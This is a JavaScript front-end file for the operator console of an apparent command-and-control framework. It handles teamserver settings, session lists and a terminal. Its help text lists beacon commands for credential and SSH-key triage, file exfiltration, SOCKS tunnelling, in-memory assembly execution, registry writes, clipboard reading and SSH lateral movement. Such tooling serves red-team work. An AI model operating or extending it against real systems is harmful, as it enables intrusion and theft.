// core.js — constants, state, utilities, auth, UI helpers

// ---- Stars ----

function initStars() {
    const container = document.createElement('div');
    container.id = 'stars';
    document.documentElement.appendChild(container);
    for (let i = 0; i < 150; i++) {
        const star = document.createElement('div');
        star.className = 'star';
        star.style.left    = (Math.random() * 100).toFixed(2) + 'vw';
        star.style.top     = (Math.random() * 100).toFixed(2) + 'vh';
        star.style.opacity = (0.05 + Math.random() * 0.2).toFixed(2);
        const size = Math.random() < 0.85 ? 1 : 2;
        star.style.width  = size + 'px';
        star.style.height = size + 'px';
        container.appendChild(star);
    }
}

initStars();

// ---- Terminal Resizer ----

function initTerminalResizer() {
    const resizer = document.getElementById('terminal-resizer');
    const workspace = document.querySelector('.workspace');
    if (!resizer || !workspace) return;

    let isResizing = false;

    resizer.addEventListener('mousedown', (e) => {
        isResizing = true;
        workspace.classList.add('resizing');
        document.body.style.cursor = 'row-resize';
        e.preventDefault();
    });

    document.addEventListener('mousemove', (e) => {
        if (!isResizing) return;
        const workspaceRect = workspace.getBoundingClientRect();
        const newHeight = workspaceRect.bottom - e.clientY;

        // Clamp height between 100px and 80% of workspace
        const clampedHeight = Math.max(100, Math.min(newHeight, workspaceRect.height * 0.8));
        document.documentElement.style.setProperty('--terminal-height', clampedHeight + 'px');

        if (_currentView === 'map') loadSessions();
    });

    document.addEventListener('mouseup', () => {
        if (isResizing) {
            isResizing = false;
            workspace.classList.remove('resizing');
            document.body.style.cursor = '';
            const h = getComputedStyle(document.documentElement).getPropertyValue('--terminal-height');
            localStorage.setItem('bebop_termHeight', h.trim());
        }
    });
}

function initPanelResizerH() {
    const resizer = document.getElementById('panel-resizer-h');
    const container = document.querySelector('.bottom-panels');
    const termPanel = document.querySelector('.terminal-panel');
    const logPanel = document.querySelector('.event-log-panel');
    if (!resizer || !container || !termPanel || !logPanel) return;

    let isResizing = false;

    resizer.addEventListener('mousedown', (e) => {
        isResizing = true;
        container.classList.add('resizing-h');
        document.body.style.cursor = 'col-resize';
        e.preventDefault();
    });

    document.addEventListener('mousemove', (e) => {
        if (!isResizing) return;
        const rect = container.getBoundingClientRect();
        const offset = e.clientX - rect.left;
        const minW = 200;
        const clamped = Math.max(minW, Math.min(offset, rect.width - minW));
        const ratio = clamped / rect.width;
        termPanel.style.flex = 'none';
        logPanel.style.flex = 'none';
        termPanel.style.width = (ratio * 100) + '%';
        logPanel.style.width = ((1 - ratio) * 100) + '%';
        if (_term) _fitAddon.fit();
        if (_shellTerm && _shellFit) try { _shellFit.fit(); } catch(_) {}
    });

    document.addEventListener('mouseup', () => {
        if (isResizing) {
            isResizing = false;
            container.classList.remove('resizing-h');
            document.body.style.cursor = '';
            if (_term) _fitAddon.fit();
            if (_shellTerm && _shellFit) try { _shellFit.fit(); } catch(_) {}
        }
    });
}

// Call inits
setTimeout(() => {
    initTerminalResizer();
    initPanelResizerH();
    initMapControls();
}, 100);

// ---- Navigation ----

let _currentView = 'table';

function setView(view) {
    _currentView = view;
    const tableView = document.getElementById('sessions-table-view');
    const mapView = document.getElementById('map-view');

    const btnTable = document.getElementById('btn-view-table');
    const btnMap = document.getElementById('btn-view-map');

    if (tableView) tableView.style.display = 'none';
    if (mapView) mapView.style.display = 'none';

    [btnTable, btnMap].forEach(btn => { if (btn) btn.classList.remove('active'); });

    if (view === 'table') {
        if (tableView) tableView.style.display = 'block';
        if (btnTable) btnTable.classList.add('active');
    } else {
        if (mapView) mapView.style.display = 'flex';
        if (btnMap) btnMap.classList.add('active');
        const noMsg = document.getElementById('no-sessions');
        if (noMsg) noMsg.style.display = 'none';
    }
    if (_operatorWs && _operatorWs.readyState === WebSocket.OPEN) {
        _renderSessionsFromCache();
    } else {
        loadSessions();
    }
}

// ---- Teamserver config ----

function getTsUrl() {
    const ip   = localStorage.getItem('tsIp')   || '';
    const port = localStorage.getItem('tsPort')  || '8080';
    if (!ip) return '';
    return 'http://' + ip + ':' + port;
}

function saveSettings() {
    const ipEl = document.getElementById('tsIp');
    const portEl = document.getElementById('tsPort');
    if (!ipEl || !portEl) return;

    const ip   = ipEl.value.trim();
    const port = portEl.value.trim() || '8080';

    localStorage.setItem('tsIp',   ip);
    localStorage.setItem('tsPort', port);

    updateConnIndicator(!!ip);

    // Refresh current view
    if (document.getElementById('sessions-table-view')) loadSessions();
    if (document.getElementById('listeners-tbody')) loadListeners();
    if (document.getElementById('build-btn')) populateBuildListeners();
}

function initSettings() {
    ensureSettingsModal();
    const ipEl   = document.getElementById('tsIp');
    const portEl = document.getElementById('tsPort');
    if (ipEl)   ipEl.value   = localStorage.getItem('tsIp')   || '';
    if (portEl) portEl.value = localStorage.getItem('tsPort')  || '';
    updateConnIndicator(!!(localStorage.getItem('tsIp') || ''));
}

function ensureSettingsModal() {
    if (document.getElementById('settings-modal')) return;
    const wrap = document.createElement('div');
    wrap.innerHTML = [
        '<div id="settings-modal" class="modal-backdrop" hidden>',
        '  <div class="modal-card" role="dialog" aria-modal="true" aria-labelledby="settings-title">',
        '    <span class="modal-tab">// connection</span>',
        '    <button type="button" class="modal-close" aria-label="Close">×</button>',
        '    <h3 id="settings-title" class="modal-title">Teamserver</h3>',
        '    <p class="modal-subtitle">route operator traffic to the C2 frame</p>',
        '    <div class="modal-row">',
        '      <div class="modal-field">',
        '        <label for="tsIp">host</label>',
        '        <input id="tsIp" type="text" placeholder="192.168.1.100" autocomplete="off" spellcheck="false">',
        '      </div>',
        '      <div class="modal-field modal-field-narrow">',
        '        <label for="tsPort">port</label>',
        '        <input id="tsPort" type="text" placeholder="8080" autocomplete="off" spellcheck="false">',
        '      </div>',
        '    </div>',
        '    <div class="modal-footer">',
        '      <a href="#" class="modal-logout" data-action="logout" title="Log out of this session">',
        '        <svg class="modal-logout-svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>',
        '        <span>jack out</span>',
        '      </a>',
        '      <div class="modal-actions">',
        '        <button type="button" class="btn-ghost" data-action="cancel">cancel</button>',
        '        <button type="button" data-action="save">connect</button>',
        '      </div>',
        '    </div>',
        '  </div>',
        '</div>'
    ].join('');
    const modal = wrap.firstElementChild;
    document.body.appendChild(modal);

    modal.addEventListener('click', (e) => {
        if (e.target === modal) closeSettings();
    });
    modal.querySelector('.modal-close').addEventListener('click', closeSettings);
    modal.querySelector('[data-action="cancel"]').addEventListener('click', closeSettings);
    modal.querySelector('[data-action="save"]').addEventListener('click', () => {
        saveSettings();
        closeSettings();
    });
    modal.querySelector('[data-action="logout"]').addEventListener('click', (e) => {
        e.preventDefault();
        logout();
    });

    document.addEventListener('keydown', (e) => {
        if (modal.hidden) return;
        if (e.key === 'Escape') { e.preventDefault(); closeSettings(); }
        else if (e.key === 'Enter') { e.preventDefault(); saveSettings(); closeSettings(); }
    });
}

function openSettings() {
    ensureSettingsModal();
    const modal = document.getElementById('settings-modal');
    const ip    = document.getElementById('tsIp');
    const port  = document.getElementById('tsPort');
    if (ip)   ip.value   = localStorage.getItem('tsIp')   || '';
    if (port) port.value = localStorage.getItem('tsPort')  || '8080';
    modal.hidden = false;
    requestAnimationFrame(() => modal.classList.add('open'));
    setTimeout(() => {
        if (ip && !ip.value) ip.focus();
        else if (ip) ip.select();
    }, 40);
}

function closeSettings() {
    const modal = document.getElementById('settings-modal');
    if (!modal || modal.hidden) return;
    modal.classList.remove('open');
    setTimeout(() => { modal.hidden = true; }, 180);
}

function updateConnIndicator(connected) {
    const dot    = document.getElementById('conn-dot');
    const status = document.getElementById('conn-status');
    if (dot)    dot.className    = 'conn-dot' + (connected ? ' connected' : '');
    if (status) status.textContent = connected ? 'CONNECTED' : 'OFFLINE';
}

// ---- Auth ----

async function authFetch(url, options = {}) {
    const token = localStorage.getItem('authToken');
    if (token) {
        if (!options.headers) options.headers = {};
        if (options.headers instanceof Headers) {
            options.headers.set('Authorization', 'Bearer ' + token);
        } else {
            options.headers['Authorization'] = 'Bearer ' + token;
        }
    }
    const resp = await fetch(url, options);
    if (resp.status === 401) {
        localStorage.removeItem('authToken');
        window.location.href = '/login';
        throw new Error('unauthorized');
    }
    return resp;
}

function checkAuth() {
    const token = localStorage.getItem('authToken');
    if (!token) {
        window.location.href = '/login';
        return false;
    }
    return true;
}

async function logout() {
    const token = localStorage.getItem('authToken');
    if (token) {
        try {
            await fetch('/api/auth/logout', {
                method: 'POST',
                headers: { 'Authorization': 'Bearer ' + token }
            });
        } catch (_) {}
    }
    localStorage.removeItem('authToken');
    window.location.href = '/login';
}

// ---- Client-side help ----

const HELP_TEXT = [
    '',
    '[ 01. IDENTITY & RECON ]',
    '  whoami              Query current session user context',
    '  hostname            Display target machine network name',
    '  domain              Retrieve DNS domain / AD membership status',
    '  getpid              Show process ID of the running implant',
    '  getintegrity        Check token integrity (Low/Med/High/System)',
    '',
    '[ 02. SYSTEM ENUMERATION ]',
    '  sysinfo             Retrieve OS build, arch, and memory metrics',
    '  drives              List logical drives and available storage',
    '  env                 Dump all process environment variables',
    '  getenv <var>        Get value of a specific environment variable',
    '',
    '[ 03. FILESYSTEM MANIPULATION ]',
    '  pwd                 Print current working directory',
    '  cd <path>           Change working directory',
    '  ls [path]           List directory contents (Alias: dir)',
    '  cat <file>          Read and display raw file content',
    '  stat <path>         Get file/directory metadata and timestamps',
    '  mkdir <path>        Create a new directory',
    '  rm <file>           Permanently delete a file',
    '  rmdir <path>        Remove an empty directory',
    '  cp <src> <dst>      Copy file to a new destination',
    '  mv <src> <dst>      Move or rename file/directory',
    '',
    '[ 04. PROCESS & NETWORK ]',
    '  ps                  List active processes (PID, PPID, Name)',
    '  kill <pid>          Terminate a process by its ID',
    '  ipconfig            List network adapters and IP addresses',
    '  arp                 Display current ARP cache entries',
    '  netstat             List active TCP/UDP connections and listening ports',
    '  dns <name>          Resolve hostname to IP via DnsQuery (no nslookup)',
    '',
    '[ 05. PRIVILEGES & GROUPS ]',
    '  privs               List token privileges (SeDebug, SeImpersonate, etc.)',
    '  groups              List local groups the current user belongs to',
    '',
    '[ 06. PERSISTENCE & CONFIGURATION ]',
    '  services            Enumerate all Win32 services (name, state, PID)',
    '  uptime              Time since last system boot (GetTickCount64)',
    '  reg_query <H\\key> <val>   Read a registry value (HKLM/HKCU/HKCR/HKU)',
    '  reg_set   <H\\key> <val> <data>  Write a REG_SZ registry value',
    '',
    '[ 07. DATA COLLECTION ]',
    '  clipboard           Read current clipboard text content',
    '',
    '[ 08. BEACON CONTROL ]',
    '  sleep <sec> [jit]   Adjust check-in interval and jitter %',
    '  interactive         Upgrade to persistent TCP session (real-time)',
    '  shell               Open interactive shell (requires session mode)',
    '  socks5 start [port] Start SOCKS5 proxy tunnel (requires session mode)',
    '  socks5 stop         Stop active SOCKS5 proxy tunnel',
    '  exit                Terminate the beacon process',
    '',
    '[ 09. EXECUTION MODES ]',
    '  runas <user> <pass> <cmd>  Run command as another user (no runas.exe)',
    '  shell <cmd>         Execute via cmd.exe /c (Supports pipes/built-ins)',
    '  <program> [args]    Direct execution (No cmd.exe - Stealthier)',
    '',
    '[ 10. EXECUTE-ASSEMBLY ]',
    '  execute-assembly [args]         Execute .NET assembly in memory (file picker)',
    '  execute-assembly <name> [args]  Execute .NET assembly from library',
    '  assembly-upload <name>          Upload .NET assembly to library',
    '  assembly-list                   List assemblies in library',
    '  assembly-delete <name>          Remove assembly from library',
    '',
    '[ 11. TERMINAL ]',
    '  help                Show this command reference',
    '  clear               Clear the terminal screen',
    '',
    '[ 12. FILE TRANSFER ]',
    '  download <remote>    Exfil file from target to teamserver (beacon→op)',
    '  upload <remote>     Upload file from operator to target path (op→beacon)',
    '                      Opens a file picker, then stages the selected file to <remote>',
    '',
    '───────────────────────────────────────────────────────────────',
    'All commands are executed natively via Win32 API unless "shell" is used.',
];

const HELP_TEXT_LINUX = [
    '',
    '[ 01. IDENTITY & RECON ]',
    '  whoami / id         User context (uid, gid, groups)',
    '  hostname            Machine hostname and kernel info',
    '',
    '[ 02. FILESYSTEM ]',
    '  pwd                 Print working directory',
    '  cd <path>           Change working directory',
    '  ls [path]           List directory with permissions and metadata',
    '  cat <file>          Read file content (max 1MB)',
    '  mkdir <path>        Create directory',
    '  rm [-r] <path>      Delete file or directory (-r for recursive)',
    '  cp <src> <dst>      Copy file',
    '  mv <src> <dst>      Move or rename file',
    '  chmod <mode> <path> Change permissions (octal, e.g. 755)',
    '',
    '[ 03. PROCESS & ENVIRONMENT ]',
    '  ps                  List processes (PID, PPID, user, command)',
    '  kill [sig] <pid>    Send signal to process (default: SIGTERM)',
    '  env                 List all environment variables',
    '  getenv <var>        Get specific environment variable',
    '',
    '[ 04. NETWORK ]',
    '  ipconfig / ifconfig  List network interfaces with IPs and MACs',
    '  netstat             List TCP/UDP connections and listeners',
    '  curl <url>          HTTP GET request (http only)',
    '  portscan <host> <ports>  TCP connect scan (supports CIDR)',
    '',
    '[ 05. OFFENSIVE ]',
    '  triagedirectory [path]   Find sensitive files (SSH keys, creds, configs)',
    '  ssh <user@host> <cmd>    Execute command on remote host via SSH',
    '',
    '[ 06. FILE TRANSFER ]',
    '  download <remote>   Exfil file from target to teamserver',
    '  upload <remote>     Upload file from operator to target path',
    '',
    '[ 07. BEACON CONTROL ]',
    '  sleep <sec> [jit]   Adjust check-in interval and jitter %',
    '  interactive         Upgrade to persistent TCP session (real-time)',
    '  socks5 start [port] Start SOCKS5 proxy tunnel (requires session mode)',
    '  socks5 stop         Stop active SOCKS5 proxy tunnel',
    '  exit                Terminate the beacon process',
    '',
    '[ 08. SHELL PASSTHROUGH ]',
    '  shell <cmd>         Execute command via /bin/sh -c (pipes, redirects)',
    '',
    '[ 09. TERMINAL ]',
    '  help                Show this command reference',
    '  clear               Clear the terminal screen',
    '',
    '───────────────────────────────────────────────────────────────',
    'All commands are native builtins (no child process). Use "shell <cmd>" for /bin/sh.',
];

// ---- Utilities ----

const VALID_COMMANDS_LINUX = [
    'whoami', 'id', 'hostname', 'pwd', 'cd', 'ls', 'cat', 'mkdir',
    'rm', 'cp', 'mv', 'chmod', 'ps', 'kill', 'env', 'getenv',
    'ipconfig', 'ifconfig', 'netstat', 'curl', 'portscan',
    'triagedirectory', 'ssh',
    'sleep', 'interactive', 'shell', 'exit', 'help', 'clear',
    'download', 'upload', 'socks5',
];

const VALID_COMMANDS = [
    'whoami', 'hostname', 'domain', 'getpid', 'getintegrity',
    'sysinfo', 'drives', 'env', 'getenv', 'pwd', 'cd', 'ls', 'dir',
    'cat', 'stat', 'mkdir', 'rm', 'rmdir', 'cp', 'mv', 'ps', 'kill',
    'ipconfig', 'arp', 'netstat', 'dns',
    'privs', 'groups', 'services', 'uptime',
    'reg_query', 'reg_set', 'clipboard', 'runas',
    'shell', 'sleep', 'interactive', 'exit', 'help', 'clear',
    'download', 'upload', 'socks5',
    'execute-assembly', 'assembly-upload', 'assembly-list', 'assembly-delete',
];

const ARCH_MAP      = ['x86', 'x64', 'arm', 'arm64'];
const PLATFORM_MAP  = ['Linux', 'macOS', 'Windows'];
const INTEGRITY_MAP = ['Untrusted', 'Low', 'Medium', 'High', 'System'];

function timeAgo(unixTs) {
    const diff = Math.floor(Date.now() / 1000) - unixTs;
    if (diff < 60)   return diff + 's ago';
    if (diff < 3600) return Math.floor(diff / 60) + 'm ago';
    return Math.floor(diff / 3600) + 'h ago';
}

setInterval(() => {
    document.querySelectorAll('[data-ts]').forEach(el => {
        el.textContent = timeAgo(+el.dataset.ts);
    });
    const now = Math.floor(Date.now() / 1000);
    let changed = false;
    for (const b of Object.values(_beacons || {})) {
        const wasAlive = b.alive;
        b.alive = b.last_seen && (now - b.last_seen) < 180;
        if (b.alive !== wasAlive) changed = true;
    }
    if (changed) _renderSessionsFromCache();
}, 1000);

function escapeHtml(s) {
    return String(s)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

// ---- Kill beacon ----

let _killTargetId = null;

let _killIsDead = false;

function showKillModal(id, hostname, isDead) {
    _killTargetId = id;
    _killIsDead = !!isDead;
    const el = document.getElementById('kill-modal-target');
    if (el) el.textContent = hostname || ('beacon #' + id);
    const label = document.getElementById('kill-modal-label');
    if (label) label.textContent = isDead ? 'Delete' : 'Kill';
    const btn = document.getElementById('kill-modal-confirm');
    if (btn) {
        btn.textContent = isDead ? 'DELETE' : 'KILL';
        btn.className = isDead ? 'btn-delete' : 'btn-kill';
    }
    const modal = document.getElementById('kill-modal');
    if (modal) modal.style.display = 'flex';
}

function cancelKill() {
    _killTargetId = null;
    const modal = document.getElementById('kill-modal');
    if (modal) modal.style.display = 'none';
}

async function confirmKill() {
    const id = _killTargetId;
    const target = document.getElementById('kill-modal-target');
    const hostname = target ? target.textContent : '#' + id;
    cancelKill();
    if (id == null) return;
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    try {
        await authFetch(tsUrl + '/api/sessions/' + id, { method: 'DELETE' });
    } catch (e) {
        console.error('kill beacon:', e);
    }
    loadSessions();
}

// ---- Toast ----

function showToast(hostname, username) {
    const container = document.getElementById('toast-container');
    if (!container) return;
    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.innerHTML =
        '<div class="toast-dot"></div>' +
        '<div>' +
            '<div class="toast-title">NEW SESSION</div>' +
            '<div class="toast-body">' + escapeHtml(hostname) + ' // ' + escapeHtml(username) + '</div>' +
            '<div class="toast-quote">"A new soul has drifted in."</div>' +
        '</div>';
    container.appendChild(toast);
    requestAnimationFrame(() => {
        requestAnimationFrame(() => toast.classList.add('toast-visible'));
    });
    setTimeout(() => {
        toast.classList.remove('toast-visible');
        toast.classList.add('toast-hiding');
        setTimeout(() => { if (toast.parentNode) toast.parentNode.removeChild(toast); }, 400);
    }, 4000);
}

// ---- Sessions page ----

let _knownBeaconIds    = null;
let _knownBeaconAlive  = {};
let _beacons           = {};
let sessionWs          = null;
const _beaconModes     = {};

function _isFbTab(id) {
    return typeof id === 'string' && (id.startsWith('fb_') || id.startsWith('fbs_'));
}
function _fbTabBid(id) {
    if (typeof id === 'string' && id.startsWith('fbs_')) return parseInt(id.slice(4), 10);
    if (typeof id === 'string' && id.startsWith('fb_')) return parseInt(id.slice(3), 10);
    return id;
}

function _actualBid() {
    if (typeof beaconId === 'string') {
        if (beaconId.startsWith('fbs_')) return parseInt(beaconId.slice(4), 10);
        if (beaconId.startsWith('fbs_')) return parseInt(beaconId.slice(4), 10);
        if (beaconId.startsWith('fb_')) return parseInt(beaconId.slice(3), 10);
        if (beaconId.startsWith('sess_')) return parseInt(beaconId.slice(5), 10);
        if (beaconId.startsWith('shell_')) return parseInt(beaconId.slice(6), 10);
    }
    return beaconId;
}

function _isSessionTab() {
    return typeof beaconId === 'string' && beaconId.startsWith('sess_');
}

// Shell tab state (separate xterm instance)
let _shellTerm        = null;
let _shellFit         = null;
let _shellWsMap       = new Map();
let _activeShellBid   = null;

function beaconStatus(b) {
    if (!b.alive) return 'dead';
    return 'active';
}

// ---- ANSI constants ----

const ANSI = {
    reset: '\x1b[0m',
    amber: '\x1b[33m',
    cream: '\x1b[97m',
    red:   '\x1b[91m',
    dim:   '\x1b[2m',
};

const PROMPT_STR = ANSI.amber + '[BEBOP ~]$ ' + ANSI.reset;
